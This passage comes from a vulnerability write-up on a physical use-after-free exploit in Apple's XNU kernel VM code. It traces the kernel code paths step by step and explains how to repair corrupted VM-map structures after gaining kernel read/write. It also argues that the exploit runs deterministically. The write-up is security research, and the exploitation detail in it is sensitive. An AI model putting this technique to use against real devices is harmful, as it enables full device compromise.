                         * which does nothing because end is smaller than start.
                         */
                        pmap_remove_options(
                            dst_map->pmap,
                            (addr64_t)(entry->vme_start),
                            (addr64_t)(entry->vme_end),
                            PMAP_OPTIONS_REMOVE
                        );
                    }

                    /*
                     * [STEP 5]
                     * @note:
                     * During the 2nd iteration of STEP 5, we deallocate the last reference to vmo2 here,
                     * which then calls vm_object_reap(). The pages of vmo2, which we are still pmapped in the
                     * VA range [B,C), are released at the end of the free list without calling pmap_disconnect().
                     */
                    vm_object_deallocate(old_object);
                }
            }

            if (entry->iokit_acct) {  // branch not taken
                ...
            } else { // branch taken
                entry->use_pmap = TRUE;
            }

            assert(!entry->vme_permanent);

            /*
             * (5)
             * @note:
             * 1st iteration: VME_OBJECT(vme1) := vmo2, VME_OFFSET(vme1) := 0
             * 2nd iteration: VME_OBJECT(vme2) := vmo2, VME_OFFSET(vme2) := XP
             */
            VME_OBJECT_SET(entry, VME_OBJECT(copy_entry), false, 0);
            object = VME_OBJECT(entry);
            entry->needs_copy = copy_entry->needs_copy;
            entry->wired_count = 0;
            entry->user_wired_count = 0;
            offset = VME_OFFSET(copy_entry);
            VME_OFFSET_SET(entry, offset);

            vm_map_copy_entry_unlink(copy, copy_entry);
            vm_map_copy_entry_dispose(copy_entry);

            /*
             * (6)
             * @note:
             * 1st iteration: start := C, tmp_entry := vme2
             * 2nd iteration: start := 0, tmp_entry := vme2a (but we exit the while loop because no more VMEs in the copy)
             */
            start = tmp_entry->vme_end;
            tmp_entry = tmp_entry->vme_next;

        } else { // branch not taken
            ...
        }
    }

    return KERN_SUCCESS;
}
```

#### STEP 4:

This step "simplifies" `vme1` and `vme2` in addition to `vme2a` and `vme2b`. Note that the reason
why we went through the trouble of calling `vm_copy()` before calling `memset()` in step 3 is that
`vme1` and `vme2` must share the same VMO in order for us to be able to simplify those VMEs in this
step. Simply calling `memset()` would have also successfully entered the PTEs in the VA range of
[B,C) of `vme1`, but it wouldn't share its VMO with `vme2`. The code for `vm_map_protect()` was
already described in step 2, so it won't be repeated here. In short, the `protection` of `vme2a`
will be restored to `VM_PROT_DEFAULT` (i.e. remember that it was changed to `VM_PROT_WRITE` by one
of the 4 spinner threads). Finally, in the last while loop, `vm_map_simplify_entry()` is called
successfully twice. The first time with `vme2`, which is simplified with the preceding `vme1`. And
the second time with `vme2b`, which is simplified with the preceding `vme2a`.

Here is the detailed description of the code path in `vm_map_simplify_entry()` with `vme2`:

```c
void
vm_map_simplify_entry(
    vm_map_t       map,        // map == current_map()
    vm_map_entry_t this_entry) // this_entry == vme2
{
    vm_map_entry_t prev_entry;

    prev_entry = this_entry->vme_prev; // prev_entry := vme1

    /*
     * @note:
     * All conditions are satisfied to simplify vme1 and vme2.
     */
    if ((this_entry != vm_map_to_entry(map)) &&
        (prev_entry != vm_map_to_entry(map)) &&
        (prev_entry->vme_end == this_entry->vme_start) &&
        (prev_entry->is_sub_map == this_entry->is_sub_map) &&
        (prev_entry->vme_object_value == this_entry->vme_object_value) &&
        (prev_entry->vme_kernel_object == this_entry->vme_kernel_object) &&
        ((VME_OFFSET(prev_entry) + (prev_entry->vme_end - prev_entry->vme_start)) == VME_OFFSET(this_entry)) &&
        (prev_entry->behavior == this_entry->behavior) &&
        (prev_entry->needs_copy == this_entry->needs_copy) &&
        (prev_entry->protection == this_entry->protection) &&
        (prev_entry->max_protection == this_entry->max_protection) &&
        (prev_entry->inheritance == this_entry->inheritance) &&
        (prev_entry->use_pmap == this_entry->use_pmap) &&
        (VME_ALIAS(prev_entry) == VME_ALIAS(this_entry)) &&
        (prev_entry->no_cache == this_entry->no_cache) &&
        (prev_entry->vme_permanent == this_entry->vme_permanent) &&
        (prev_entry->map_aligned == this_entry->map_aligned) &&
        (prev_entry->zero_wired_pages == this_entry->zero_wired_pages) &&
        (prev_entry->used_for_jit == this_entry->used_for_jit) &&
        (prev_entry->pmap_cs_associated == this_entry->pmap_cs_associated) &&
        (prev_entry->iokit_acct == this_entry->iokit_acct) &&
        (prev_entry->vme_resilient_codesign == this_entry->vme_resilient_codesign) &&
        (prev_entry->vme_resilient_media == this_entry->vme_resilient_media) &&
        (prev_entry->vme_no_copy_on_read == this_entry->vme_no_copy_on_read) &&
        (prev_entry->wired_count == this_entry->wired_count) &&
        (prev_entry->user_wired_count == this_entry->user_wired_count) &&
        (prev_entry->vme_atomic == FALSE) &&
        (this_entry->vme_atomic == FALSE) &&
        (prev_entry->in_transition == FALSE) &&
        (this_entry->in_transition == FALSE) &&
        (prev_entry->needs_wakeup == FALSE) &&
        (this_entry->needs_wakeup == FALSE) &&
        (prev_entry->is_shared == this_entry->is_shared) &&
        (prev_entry->superpage_size == FALSE) &&
        (this_entry->superpage_size == FALSE)) { // branch taken
        if (prev_entry->vme_permanent) { // branch not taken
            ...
        }

        vm_map_store_entry_unlink(map, prev_entry, true); // vme1 is unlinked

        this_entry->vme_start = prev_entry->vme_start; // vme2->vme_start := B
        VME_OFFSET_SET(this_entry, VME_OFFSET(prev_entry)); // VME_OFFSET(vme2) := 0

        if (map->holelistenabled) { // branch taken
            vm_map_store_update_first_free(map, this_entry, TRUE);
        }

        if (prev_entry->is_sub_map) { // branch not taken
            ...
        } else {
            vm_object_deallocate(VME_OBJECT(prev_entry)); // vmo2->ref_count := 1
        }

        vm_map_entry_dispose(prev_entry); // vme1 is deallocated
        SAVE_HINT_MAP_WRITE(map, this_entry); // map->hint := vme2
    }
}
```

#### STEP 5:

This step essentially repeats the same process as in step 3. At a high-level, it makes a copy of
(X+2) pages from `vme4`, which are first populated and zero-filled into `vmo1`, and then inserts
them starting at `vme0`. Once again, note that since `vmo1` has a `copy_strategy` of
`MEMORY_OBJECT_COPY_NONE`, no copy-on-write optimization is applied during the `vm_map_copyin()`
part of the `vm_copy()`. Instead, a new VMO (i.e. `vmo3`) is allocated to hold the (X+2) copied
pages in `vm_object_copy_slowly()`. When `vm_map_copyin()` returns, the VMC contains a single VME
which owns the only reference to `vmo3` at that point. Then, `vm_copy()` calls
`vm_map_copy_overwrite()`, which in turn calls `vm_map_copy_overwrite_nested()`, which finally calls
`vm_map_copy_overwrite_aligned()`. This is where `vmo3` is moved out of the temporary VMC and
becomes shared between `vme0` and `vme2`, as shown in the image above.

Note that in step 3, when `vm_map_copy_overwrite_aligned()` inserted `vmo2` into `vme1` and `vme2`,
both these VMEs had previously no associated VMOs. However, here in step 5, when the same function
inserts `vmo3` into `vme0` and `vme2` (i.e. remember that `vme1` was deallocated in step 4), only
`vme0` had previously no associated VMO. In contrast, `vme2` has the only reference to `vmo2`, which
contains the X pages that we have pmapped in the VA range of [B,C). The code snippet for
`vm_map_copy_overwrite_aligned()` in step 3 has additional comments, annotated with `[STEP 5]`, to
explain what happens. In short, `pmap_remove_options()` is called for the VA range of the VME that
is being overwritten, which is [B,0) in the case of `vme2`. However, this does absolutely nothing
because the end address is smaller than the start address. Finally, `vm_object_deallocate()` is
called to release the last reference on `vmo2`. This triggers `vm_object_reap()`, which will put
all the pages of `vmo2` back on the free list without calling `pmap_disconnect()`. That said, the
PTEs in the VA range of [B,C) still point to X of those pages with both read and write permissions.

Here is the detailed description of the code path in `pmap_remove_options()`:

```c
void
pmap_remove_options(
    pmap_t           pmap,    // pmap == current_pmap()
    vm_map_address_t start,   // start == B
    vm_map_address_t end,     // end == 0
    int              options) // options == PMAP_OPTIONS_REMOVE
{
    vm_map_address_t va;

    if (pmap == PMAP_NULL) { // branch not taken
        return;
    }

    __unused const pt_attr_t * const pt_attr = pmap_get_pt_attr(pmap);

#if MACH_ASSERT
    if ((start | end) & pt_attr_leaf_offmask(pt_attr)) {
        panic("pmap_remove_options() pmap %p start 0x%llx end 0x%llx",
            pmap, (uint64_t)start, (uint64_t)end);
    }
    if ((end < start) || (start < pmap->min) || (end > pmap->max)) { // only for DEBUG and DEVELOPMENT builds
        panic("pmap_remove_options(): invalid address range, pmap=%p, start=0x%llx, end=0x%llx",
            pmap, (uint64_t)start, (uint64_t)end);
    }
#endif

    if ((end - start) > (pt_attr_page_size(pt_attr) * PAGE_RATIO)) { // branch taken
        pmap_verify_preemptible();
    }

    va = start; // va := B
    while (va < end) { // branch not taken, because (va > end)
        ...
    }
}
```

---

## Part B: From PUAF to KRKW

This part of the exploit is shared across all PUAF exploits, so please check the write-up about
[exploiting PUAFs](exploiting-puafs.md) for more details.

---

## Part C: From KRKW to Cleanup

Unfortunately, the exploit causes undesirable side effects in our VM map, which will trigger a
kernel panic when the process performs certain VM operations or when the process exits, if left
unaddressed. One obvious side effect that is observable at the end of step 5 is that we are left
with an inverted VME. Indeed, `vme2` has a VA range of [B,0). For example, if not fixed, this will
cause a "NO ENTRY TO DELETE" panic during the destruction of the VM map. However, there are even
more side effects that we will need to fix. The astute reader might have noticed the omission of the
impact of the exploit on the red-black tree and the hole list. This part of the write-up is meant to
explain all those side effects in detail, and how to fix them, which is done in the function
`smith_helper_cleanup()`.

#### Cleaning Up the Doubly-Linked List of VMEs

The state of the doubly-linked list at the end of step 5 should be clear from the image in part A.
We fix it by leaking `vme2b` and simply patching the end address of `vme2` to D, such that its VA
range becomes [B,D) rather than [B,0). Note that this requires three 64-bit writes: one to change
the `vme_prev` pointer of `vme3`, one to change the `vme_next` pointer of `vme2`, and one to change
the `vme_end` address of `vme2`. Also, please note that this part of the cleanup procedure is fully
deterministic because of the predictable and sorted nature of the doubly-linked list of VMEs.

Here is an illustration of that procedure:

![smith-figure2.png](figures/smith-figure2.png)

#### Cleaning Up the Red-Black Tree of VMEs

Before we trigger the vulnerability in step 2, the state of the red-black tree is in good order.
However, when we trigger the bad clip in `vm_map_copyin_internal()` during substep 2A, we allocate
and insert `vme2a` with a VA range of [0,D) into the red-black tree. Because the start address is 0,
it will be inserted as the left-most node of the tree. Next, when we trigger another clip in
`vm_map_protect()` during substep 2B, we allocate and insert `vme2b` with a VA range of [1P,D) into
the red-black tree, after having updated the VA range of `vme2a` to [0,1P). Because the start
address is 1P, it will be inserted as the second-left-most node of the tree. Finally, in step 4,
`vme2a` is unlinked from the red-black tree by `vm_map_simplify_entry()`.

I have run this exploit countless times, and I have tried allocating up to 256 VMEs with
`VM_FLAGS_RANDOM_ADDR` in order to randomize the initial state of the red-black tree, but I have
never seen an outcome different than the one shown in the image below. As far as I know, because of
potential re-balancing, there is no mathematical guarantee that this will always be the case. I'm
pretty sure that the only other possibility is that `vme2b` is a leaf node at the bottom-left (i.e.
such that both its left and right children are NULL), because I believe the tree would not respect
the conditions of red-black trees otherwise. Anyway, if a different outcome did occur, we could
easily detect it with the kernel read primitive and use a different patching method in that case,
such that the cleanup procedure would still end up being deterministic. As it stands, we fix the
red-black tree once again by leaking `vme2b`. Note that this only requires two 64-bit writes: one to
change the `rbe_parent` pointer of the first VME in the doubly-linked list (i.e. the VME that had
the lowest VA range before the start of the exploit), and one to change the `rbe_left` pointer of
the second VME.

Here is an illustration of that procedure:

![smith-figure3.png](figures/smith-figure3.png)

#### Cleaning Up the Hole List

Before we trigger the vulnerability in step 2, the state of the hole list is in good order. Even
after we trigger the bad clip in `vm_map_copyin_internal()` and the one in `vm_map_protect()`, the
hole list stays unchanged because clipping is not supposed to affect it. Unfortunately,
`vm_map_simplify_entry()` does change the hole list  even if it shouldn't need to. During the first
successful simplification, `update_holes_on_entry_deletion()` is called on the VME being unlinked,
`vme1`, which has a VA range of [B,C). This creates a new hole with a VA range of [B,C) in the hole
list, just as if we had simply deallocated that VA range with `vm_deallocate()`. However,
`update_holes_on_entry_creation()` is then called on the VME being expanded, `vme2`, which now has a
VA range of [B,0). This won't delete the hole we just created, but in fact, it will create another
hole right after the first existing hole, and corrupt the end address of this first hole. During the
second successful simplification, yet another hole is temporarily created at the very beginning of
the hole list by `update_holes_on_entry_deletion()`, only to be deleted immediately by
`update_holes_on_entry_creation()`, such that the final state of the hole list is exactly the same
as after the first simplification. We fix the hole list by leaking both holes that were needlessly
created and by restoring the end address of the first hole. Therefore, after five 64-bit writes,
the hole list is back in good shape.

Please note that this cleanup procedure is fully deterministic as long as there are at least 2 holes
before address A (i.e. the start address of `vme0`). Also, it doesn't matter whether or not there
are holes after address F (i.e. the end address of `vme4`). Of course, the VA range of [A,F) is
guaranteed not to be part of the hole list because it has been allocated by our 5 VMEs. As explained
later in [Appendix A](#appendix-a-considerations-for-setup), we want to allocate our 5 VMEs towards
the end of our VM map (i.e. towards `map->max_offset`). Thus, those requirements should be trivial
to satisfy. If there was only one hole before address A, then "new hole 0" and "new hole 1" in the
image below would simply end up right next to each other. In that case, we could still clean up the
hole list deterministically with some minor adjustment. Of course, it would be much easier to just
manually create another hole preceding address A before starting the exploit.

Here is an illustration of that procedure, including the intermediate state of the hole list after
each call to `update_holes_on_entry_deletion()` and `update_holes_on_entry_creation()`:

![smith-figure4.png](figures/smith-figure4.png)

#### Cleaning Up the VM Map Metadata

Finally, we need to patch the relevant metadata in our `_vm_map` structure. First of all, since we
leaked `vme2b`, we should decrement `map->hdr.nentries` by one. As far as I know, this is not
strictly necessary for panic-safety, but I like to patch it just in case. Second, we also need to
update the `map->hint` just in case it was pointing to the leaked VME. Spoiler alert: it is because
the hint was updated to `vme2b` during the second successful simplification. Lastly, since we also
leaked two holes, we should update the `map->hole_hint` just in case it was pointing to one of them.
In practice, the hole hint should already be pointing to the first hole so this shouldn't be
necessary. Therefore, cleaning up the metadata requires up to three 64-bit writes.

#### Cleaning Up Synchronization: To Lock Or Not To Lock?

You might have noticed that this entire cleanup procedure is racy: we are making changes to our VM
map using the kernel write primitive without taking the map lock. However, there is a way to take
the map lock before we patch things up, with a single 64-bit write. If the parameter
`take_vm_map_lock` is turned on, this is done in the function `smith_helper_cleanup_pthread()`,
which is executed in its own thread. In short, in this spawned thread, we patch a VME such that its
right child points to itself. Then, we call `vm_protect()` to update the protection on a VA range to
the right of the VME that we just patched. This will cause `vm_map_protect()` to take the map lock
and spin on the right child of that VME during `vm_map_lookup_entry()`. Meanwhile, back in the main
thread, we can safely fix all side effects as described above. And when we are done, we can restore
the original right child value of the VME that is being spinned on. Even if that write is not
atomic, it will eventually be observed by the spinning thread, which will finally release the map
lock and exit back to user space.

At first, I thought that taking the map lock would only be necessary in a multi-threaded context
where other concurrent threads could modify the state of the VM map at the same time. However, I
have seen some "Kernel data abort" panics when `take_vm_map_lock` is turned off, even when I am
using a single thread, but only on iOS (i.e. not on macOS) and only occasionally. Since it works
reliably when taking the map lock on either platform, I didn't bother to investigate further.

---

## Appendix A: Considerations for Setup

The function `smith_helper_init()` is responsible for the following part of the setup:

1. Allocate every hole until the first hole is at least as big as the constant `target_hole_size`.
2. Find the last hole that is big enough to allocate our 5 VMEs from in step 1 of `smith_run()`.

Let's go through them one at a time.

As explained in part C, the PUAF exploit will corrupt the state of the red-black tree and the hole
list. Unfortunately, as a consequence of this, most VM operations that affect our VM map, such as
`vm_map_enter()` and `vm_map_delete()`, can trigger any one of many kernel panics:

- `Found an existing entry [...] instead of potential hole at address: [...]`
- `VMSEL: INSERT FAILED: [...]`
- `NO ENTRY TO DELETE`
- `Hole hint failed: Hole entry start: [...]`
- `Hole hint failed: Hole entry end: [...]`
- `Illegal action: h1: [...]`

Trust me, I have triggered them all. However, if we make sure that the first hole is bigger than a
certain size, then we could at least accommodate some calls to `vm_allocate()` with the flag
`VM_FLAGS_ANYWHERE`, up to that size. Note that we would also need to make sure that the first
hole's start address is high enough to guarantee that we don't accidentally find `vme2b` during the
insertion of the new VME, otherwise we would trigger the "Found an existing entry" panic or the
"VMSEL: INSERT FAILED" panic.

Finally, as will be explained in Appendix B, in step 1 of `smith_run()`, we want to allocate `vme0`
to `vme4` as much to the bottom-right of the red-black tree as possible. Therefore,
`smith_helper_init()` finds the last hole that is big enough to accommodate those 5 VMEs. Note that
the "high end" of the VM map is usually empty, so those 5 VMEs will almost always go into the VA
range of [map->max_offset - (3X+5)P, map->max_offset), where (3X+5)P is the total size of `vme0` to
`vme4`.

---

## Appendix B: Hacky Proof of Determinism

Here, I attempt to demonstrate that the exploit can be made deterministic in a "controlled context",
which I defined to mean that the attacker has complete control of the code running in the target
process during the critical section. For example, if the target is WebContent, that means that the
attacker is able to suspend all other threads before the vulnerability is triggered, and resume them
after the cleanup procedure is finished. Moreover, I will assume that the attacker has carefully
crafted the code running during the critical section such that it avoids all VM-related operations,
except of course for those that are directly part of the PUAF exploit. In particular, all memory
regions that must be accessed during the critical section, including for the part of the exploit
that is responsible to achieve KRKW, must be allocated and faulted in up front. Under those strict
conditions, the only VM-related operations that should occur during the critical section are the
ones in the detailed walkthrough below. Essentially, the proof of determinism hinges on VME lookups
to behave in a predictable way, despite the fact that we cannot know the exact layout of the
red-black tree from user space, even with the help of `mach_vm_region()` and similar APIs.
Fortunately, only 5 addresses will need to be looked up during the critical section:

1. `vm_map_lookup_entry()` for address 0, which must return TRUE with `vme2a`.
2. `vm_map_lookup_entry()` for address A, which must return TRUE with `vme0`.
3. `vm_map_lookup_entry()` for address B, which must return TRUE with `vme1`.
4. `vm_map_lookup_entry()` for address D, which must return TRUE with `vme3`.
5. `vm_map_lookup_entry()` for address E, which must return TRUE with `vme4`.

The uncertainty comes with the fact that `vme2a` and `vme2b` cover the VA range of [0:D). Therefore,
they overlap `vme0` and `vme1`, which must be looked up. However, the lookups above will behave as
expected as long as one crucial "axiom" holds true: no matter what, `vme2a` and `vme2b` should
always be on the left side of the red-black tree, and `vme0` to `vme4` should always be on the right
side of the tree. Note that this "axiom" is overly conservative, but it helps to simplify the proof.
Because `vme2a` and `vme2b` will deterministically have the 2 smallest starting addresses (i.e. 0
and 1P, respectively), they will always be inserted at the bottom-left of the tree. Even if
re-balancing occurs, it is impossible for any of those VMEs to end up as the root of the tree or on
the right side (as long as there are more than a handful of VMEs in the tree, which is the case by
default). So what about `vme0` to `vme4`? Naturally, we simply need to allocate them as much to the
bottom-right as we possibly can, such that it is impossible for any of them to be relocated as the
root or on the left side if re-balancing occur. Luckily, the "high end" of the virtual address space
for user processes is much more sparse than the "low end", so it is quite easy to fulfill this
requirement. If the "axiom" holds true, then all lookups for addresses A to E will immediately go
right from the root, and completely dodge `vme2a` and `vme2b`. Note that the less conservative
condition is that `vme2a` and `vme2b` are never above `vme0` to `vme4` in the red-black tree.

However, the skeptic reader still might not be convinced that this "axiom" is sufficient to
guarantee the proper behavior of the lookups for addresses A to E. That is because in step 2, `vme2`
will be clipped such that its VA range becomes [C:0). Moreover, when it comes to `vme0` to `vme4`,
we should make no assumptions about their exact layout in the red-black tree because they are
adjacent. Nonetheless, a careful analysis of `vm_map_lookup_entry()` shows that this is not a
problem, even if the corrupted `vme2` is located above the other 4 VMEs. Fortunately, the total
ordering of the VMEs in the right subtree remains unchanged after the corruption, such that all
lookups for addresses smaller than C are still guaranteed to go left of `vme2`, and all lookups for
addresses greater than or equal to D are still guaranteed to go right of `vme2`, just as if it still
had its original VA range of [C:D). In fact, the only lookups that are indeed affected are for
addresses in the VA range of [C:D), which should normally return TRUE with `vme2` but would return
FALSE because of the corrupted end address. That said, the PUAF exploit has been crafted to avoid
such lookups during the critical section: the only occurence is the very first lookup in step 2,
right before the vulnerability is triggered.

Without further ado, here is the detailed walkthrough of the PUAF exploit when it comes to
interacting with the VM map. Please note that all line numbers were taken from `vm_map.c` in
`xnu-8792.81.2`.

1. In substep 2A, `vm_copy()` calls `vm_map_copyin()`, which calls `vm_map_copyin_common()`, which
   finally calls `vm_map_copyin_internal()`, which does the following:
    - `vm_map_lock()` on line 11733.
    - `vm_map_lookup_entry()` for address C on line 11740, which is guaranteed to return `vme2`.
    - `vm_map_clip_end()` on line 11878. This clip updates `vme2` from [C:D) to [C:0), allocates
      `vme2a` with [0:D) and inserts it into the VM map. Luckily, `vm_map_store_entry_link_rb()` is
      guaranteed to not trigger the `VMSEL: INSERT FAILED` panic because `vme2a->vme_start` is 0,
      which guarantees that `rb_node_compare()` always returns -1 in the `RB_INSERT()` macro.
      Therefore, `vme2a` will always be inserted as the left-most node of the red-black tree,
      whether or not re-balancing occurs.
    - `vm_map_unlock()` on line 11848.

2. In substep 2B, `vm_protect()` calls `vm_map_protect()`, which does the following:
    - `vm_map_lock()` on line 5883.
    - `vm_map_lookup_entry()` for address 0 on line 5899, which is guaranteed to return `vme2a`.
    - `vm_map_clip_end()` on line 6048. This clip updates `vme2a` from [0:D) to [0:1P), allocates
      `vme2b` with [1P:D) and inserts it into the VM map. Luckily, `vm_map_store_entry_link_rb()` is
      guaranteed to not trigger the `VMSEL: INSERT FAILED` panic because `vme2b->vme_start` is 1P,
      which is outside the VA range of any existing VME. Therefore, `vme2b` will always be inserted
      as the second-left-most node of the red-black tree, whether or not re-balancing occurs.
    - `pmap_protect_options()` on line 6141, for [0:1P) with `VM_PROT_NONE`, which does nothing.
    - `vm_map_unlock()` on line 6159.

3. Back in substep 2A, `vm_map_copyin_internal()` does the following:
    - `vm_map_lock()` on line 11852.
    - The timestamp check on line 11853 fails because a spinner thread took the map lock.
    - `vm_map_lookup_entry()` for address 0 on line 11854, which is guaranteed to return `vme2a`.
    - The protection check on line 11868 fails because `vme2a` no longer has `VM_PROT_READ`.
    - `vm_map_unlock()` on line 11710, as part of `RETURN(KERN_PROTECTION_FAILURE)`.

Before continuing, I should note that I made the assumption that one of the 4 spinner threads will
always take the map lock before `vm_map_copyin_internal()` takes it back for a second time. Despite
having run this exploit countless times, I have never lost that race. If it did happen, we could try
to increase the number of spinner threads. Ultimately, if it was unavoidable for a tiny percentage
of the time, I believe it would not be fatal, without being 100% sure. I know that losing the race a
few times is not fatal, because we get a zone exhaustion panic if we just trigger the vulnerability
on its own, without spinner threads to trigger the exit. For example, if we lose the race once, what
happens is that `vme2a` is clipped to [0:0), and a new VME with a VA range of [0:D) is inserted after
it. Effectively, there will be an extra [0:0) VME for each time that we lose the race. In theory,
this could still be patchable, although there might be other side effects I cannot think of. Lastly,
I should also note that the spinner threads might continue to call `vm_protect()` in a busy-loop for
a short period after the protection of `vme2a` has been successfully updated to `VM_PROT_WRITE`, but
they deterministically do nothing at that point. And back to the detailed code walkthrough...

4. In step 3, `vm_copy()` calls `vm_map_copyin()`, which calls `vm_map_copyin_common()`, which
   finally calls `vm_map_copyin_internal()`, which does the following:
    - `vm_map_lock()` on line 11733.
    - `vm_map_lookup_entry()` for address D on line 11740, which is guaranteed to return `vme3`.
    - `vm_map_unlock()` on line 11989.
    - `vm_object_copy_strategically()` on line 12040, which calls `vm_object_copy_slowly()`,
       which in turn allocates `vmo2` and copies the pages of `vmo0` into it.
    - `vm_map_lock()` on line 12125.
    - We break out of the while loop because the size of `vme3` is equal to the copy size.
    - `vm_map_simplify_range()` on line 12330, which does another lookup for address D. The map
       hasn't changed since the last lookup so it returns `vme3` again. Nothing is simplified.
    - `vm_map_unlock()` on line 12336.

5. Still in step 3, `vm_copy()` calls `vm_map_copy_overwrite()`, which does the following:
    - `vm_map_lock_read()` on line 9905.
    - `vm_map_lookup_entry()` for address B on line 9906, which is guaranteed to return `vme1`.
    - `vm_map_unlock_read()` on line 9919.
    - `vm_map_copy_overwrite_nested()` on line 10017, which does the following:
        - `vm_map_lock()` on line 9236.
        - `vm_map_lookup_entry()` for address B on line 9248. The map hasn't changed since the last
          lookup so it returns `vme1` again.
        - `vm_map_copy_overwrite_aligned()` on line 9693, which does the following:
            - `VME_OBJECT(vme1)` is set to `vmo2` and `VME_OFFSET(vme1)` is set to 0.
            - `VME_OBJECT(vme2)` is set to `vmo2` and `VME_OFFSET(vme2)` is set to XP.
        - `vm_map_unlock()` on line 9707.

6. Still in step 3, we fault in X pages with `memset()`, which triggers `vm_fault_internal()`, which
   does the following:
    - `vm_map_lock_read()` on line 4177 (`vm_fault.c`).
    - `vm_map_lookup_and_lock_object()` on line 4192 (`vm_fault.c`), which does the following:
        - The `map->hint` check on line 13548 fails because it had been set to `vme4`, which was the
          last VME that we allocated in step 1 during the setup, and none of the actions we have
          done so far has modified the hint.
        - `vm_map_lookup_entry()` for address B on line 13555. The map hasn't changed since the last
          lookup so it returns `vme1` again. Please note that this entire bullet point is repeated X
          times, for each page in the VA range of [B:C), but the lookup always returns `vme1`.
        - `vmo2` is returned locked along with the corresponding offset.
    - `vm_page_lookup()` on line 4391 (`vm_fault.c`), for the object and offset returned above.
       Finally, the page returned is pmapped with `vm_fault_enter()`, then `vm_fault_complete()`
       eventually calls `vm_map_unlock_read()`.

7. In step 4, `vm_protect()` calls `vm_map_protect()`, which does the following:
    - `vm_map_lock()` on line 5883.
    - `vm_map_lookup_entry()` for address B on line 5899. The map hasn't changed since the last
       lookup so it returns `vme1` again.
    - `pmap_protect_options()` on line 6141, for [0:1P) with `VM_PROT_READ`, which does nothing.
    - `vm_map_simplify_entry()` on line 6155, which is called successfully twice:
        - On the first time, `vme1` is removed from the VM map, which is guaranteed to not trigger
          the `NO ENTRY TO DELETE` panic for the same reason that the lookup for address B is
          guaranteed to return `vme1`. Also, `vme2` is updated from [C:0) to [B:0) and the
          `map->hint` is set to `vme2`. The hole list gets corrupted here as explained in part C.
        - On the second time, `vme2a` is removed from the VM map, which is guaranteed to not trigger
          the `NO ENTRY TO DELETE` panic for the same reason that the lookup for address 0 is
          guaranteed to return `vme2a`. Also, `vme2b` is updated from [1P:D) to [0:D) and the
          `map->hint` is set to `vme2b`. More on this later!
    - `vm_map_unlock()` on line 6159.

Please note that step 5 is almost identical to step 3 in terms of code path.

8. In step 5, `vm_copy()` calls `vm_map_copyin()`, which calls `vm_map_copyin_common()`, which
   finally calls `vm_map_copyin_internal()`, which does the following:
    - `vm_map_lock()` on line 11733.
    - `vm_map_lookup_entry()` for address E on line 11740, which is guaranteed to return `vme4`.
    - `vm_map_unlock()` on line 11989.
    - `vm_object_copy_strategically()` on line 12040, which calls `vm_object_copy_slowly()`,
       which in turn allocates `vmo3` and copies the pages of `vmo1` into it.
    - `vm_map_lock()` on line 12125.
    - We break out of the while loop because the size of `vme4` is equal to the copy size.
    - `vm_map_simplify_range()` on line 12330, which does another lookup for address E. The map
       hasn't changed since the last lookup so it returns `vme4` again. Nothing is simplified.
    - `vm_map_unlock()` on line 12336.

9. Still in step 5, `vm_copy()` calls `vm_map_copy_overwrite()`, which does the following:
    - `vm_map_lock_read()` on line 9905.
    - `vm_map_lookup_entry()` for address A on line 9906, which is guaranteed to return `vme0`.
    - `vm_map_unlock_read()` on line 9919.
    - `vm_map_copy_overwrite_nested()` on line 10017, which does the following:
        - `vm_map_lock()` on line 9236.
        - `vm_map_lookup_entry()` for address A on line 9248. The map hasn't changed since the last
          lookup so it returns `vme0` again.
        - `vm_map_copy_overwrite_aligned()` on line 9693, which does the following:
            - `VME_OBJECT(vme0)` is set to `vmo3` and `VME_OFFSET(vme0)` is set to 0.
            - `pmap_remove_options()` on line 10591, for the VA range of `vme2` because it had a
              different object assocation (i.e. `vmo2`). However, the VA range of `vme2` is [B:0)
              so this does nothing because the end address is smaller than the start address.
            - `vm_object_deallocate()` on line 10597, which releases the last reference of `vmo2`
              and therefore reaps the object.
            - `VME_OBJECT(vme2)` is set to `vmo3` and `VME_OFFSET(vme2)` is set to 1P.
        - `vm_map_unlock()` on line 9707.

And voilÃ ! That is the complete code path of the PUAF exploit, and it should be deterministic in a
controlled context as defined above. One important observation is that the `map->hint` is set to
`vme2b`, which has a VA range of [0:D) at that point. Since our 5 VMEs were allocated towards
`map->max_offset`, this means that it essentially covers the entire virtual address space of our
process. Therefore, after step 4, any fault for either code or data would most likely be fatal as we
would hit `vme2b` in `vm_map_lookup_and_lock_object()` instead of the intended VME. That said, if
the code running in the critical section has been carefully crafted to avoid faults (except of
course for the explicit `memset()` in step 3), this should not be a problem. However, we could also
`vm_allocate()` a small VME with the flag `VM_FLAGS_ANYWHERE` after step 5, as explained in
Appendix A, which would update the `map->hint` to point to this new VME. But please note that this
would not be a silver bullet: if the fault occurs on a relatively low address, there is a chance
that `vme2b` is located above the intended VME in the red-black tree, which would cause the same
problem. Of course, this becomes less likely the higher the fault address is. In summary, if
possible in the target context, we should avoid all unnecessary VM-related operations during the
critical section.

P.S.: It is okay to perform certain VM-related operations as long as we know exactly what we are
doing and have made sure that it is safe. For example, after achieving the PUAF primitive, we grab
pages from the free list until we reach one of the PUAF pages. In order to do that safely, we can
pre-allocate 2 buffers, where the source buffer has been allocated with the flag `VM_FLAGS_PURGABLE`
in order to disable copy-on-write optimizations. Then, we can simply call `vm_copy()` to copy pages
from the source buffer into the destination buffer. Because the source object has a `copy_strategy`
of `MEMORY_OBJECT_COPY_NONE`, new pages will be grabbed from the free list during
`vm_object_copy_slowly()`. We simply have to make sure that the addresses of the 2 buffers do not
risk hitting `vme2b` during the lookups, which is easy to do as explained above.

```